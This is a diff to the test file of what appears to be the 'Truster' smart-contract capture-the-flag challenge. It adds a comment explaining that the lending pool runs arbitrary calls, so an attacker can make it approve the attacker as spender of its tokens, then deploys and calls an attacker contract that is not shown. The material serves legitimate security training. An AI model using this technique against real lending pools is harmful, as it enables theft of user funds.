@@ -29,9 +29,22 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+
+        /**
+        * Exploit Overview
+        * 
+        * @dev
+        * 
+        * The vulnerability is that the pool lets you run arbitrary data to an arbitrary address
+        * We just make it do an external call to the token address with the function approve with 
+        * us as the operator. 
+        * 
+        * You can find the contracts i wrote on /contracts/attacker-contracts
+     */
+        
         const AttackerContract = await ethers.getContractFactory('AttackerTrusterLenderPool', attacker);
         this.attackerContract = await AttackerContract.deploy(this.token.address, this.pool.address)
-        const tx = await this.attackerContract.connect(attacker).atacar(this.token.address)
+        const tx = await this.attackerContract.connect(attacker).attack()
         tx.wait()
     });
 
